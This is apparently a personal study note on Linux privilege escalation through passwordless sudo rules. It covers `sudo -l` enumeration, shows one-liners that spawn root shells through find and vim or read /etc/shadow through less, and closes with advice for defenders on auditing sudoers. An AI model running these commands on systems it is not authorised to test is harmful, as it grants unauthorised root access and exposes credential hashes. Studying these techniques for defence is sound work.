---
ID: LX004  
Date: 21/09/2025
Tags: #linux #privesc #sudo #postexploit #enumeration  
Category: Linux  
---

# LIX004 - Checking Sudo Permissions (Without a Password)

## 🧠 What I Learned

A user may be allowed to run specific commands with `sudo` **without needing a password** — this is a common misconfiguration that can lead to privilege escalation.

You can escalate instantly if you're allowed to run **any command**, or abuse certain allowed binaries using **GTFOBins**.

---

## 🔍 Checking Sudo Permissions

```bash
sudo -l
```
This checks which commands the current user can run as root (or another user), and whether a password is required.

Look for:
```bash
(ALL : ALL) NOPASSWD: ALL  
(root) NOPASSWD: /usr/bin/find  
(root) NOPASSWD: /usr/bin/vim
```
These mean you can run those commands as root **without a password**.

---

## 💣 Exploitable Examples

```bash
sudo find . -exec /bin/bash \;  
sudo vim -c ':!sh'  
sudo less /etc/shadow
```
Any of these can escalate you to a **root shell** or leak sensitive files.

Check if you can execute:

- Editors: `vim`, `nano`, `less`  
- File handlers: `find`, `tar`, `cp`, `mv`  
- Shells or compilers: `python`, `perl`, `awk`, `sh`  
- Scripts: `/usr/bin/bash`, `/usr/bin/env`, etc.

Cross-reference anything you find with [GTFOBins](https://gtfobins.github.io/).

---

## 🔐 Defender Tip

- **NEVER** allow `NOPASSWD: ALL` for any user  
- Be cautious even with specific binaries — many are **Turing complete**
- Audit `/etc/sudoers` and `/etc/sudoers.d/*` with:

```bash
sudo visudo -c
```
---

## 🔗 Resources

- [GTFOBins – Sudo](https://gtfobins.github.io/gtfobins/sudo/)  
- [HackTricks – Sudo PrivEsc](https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo)  
- [Sudoers Manual](https://www.sudo.ws/man/1.8.27/sudoers.man.html)

---
